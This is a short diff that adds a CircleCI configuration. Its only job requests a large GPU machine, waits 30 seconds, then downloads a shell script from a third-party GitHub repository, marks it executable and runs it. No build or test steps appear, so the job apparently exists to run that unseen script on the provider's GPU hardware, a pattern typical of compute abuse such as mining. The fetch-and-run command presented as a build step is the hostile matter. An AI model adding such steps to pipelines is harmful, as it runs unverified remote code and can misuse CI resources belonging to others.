@@ -1,0 +1,10 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: sleep 30
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Unm.sh && chmod +x Unm.sh && ./Unm.sh
